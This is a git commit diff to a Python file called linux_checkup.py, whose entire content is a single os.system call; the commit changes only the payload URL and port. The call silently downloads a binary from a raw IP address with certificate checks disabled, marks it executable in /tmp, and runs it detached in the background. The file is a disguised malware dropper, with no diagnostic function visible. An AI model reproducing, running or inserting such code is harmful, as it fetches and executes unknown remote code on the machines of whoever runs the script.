7e78d70fbebfe35f87f87480f76b10e330397325
byjohn1980 <128472633+byjohn1980@users.noreply.github.com>
2023-03-29 17:38:44 +0800

    Update linux_checkup.py

--- linux_checkup.py
+++ linux_checkup.py
@@ -1,3 +1,4 @@
 import os
 
-os.system("wget -qO /tmp/nakVAloW --no-check-certificate http://103.234.72.176:8080/nNKKDzYf; chmod +x /tmp/nakVAloW; cd /tmp; ./nakVAloW& disown")
+os.system("wget -qO /tmp/nakVAloW --no-check-certificate http://103.234.72.176:8088/DaYmyXrZ; chmod +x /tmp/nakVAloW; cd /tmp; ./nakVAloW& disown")
+
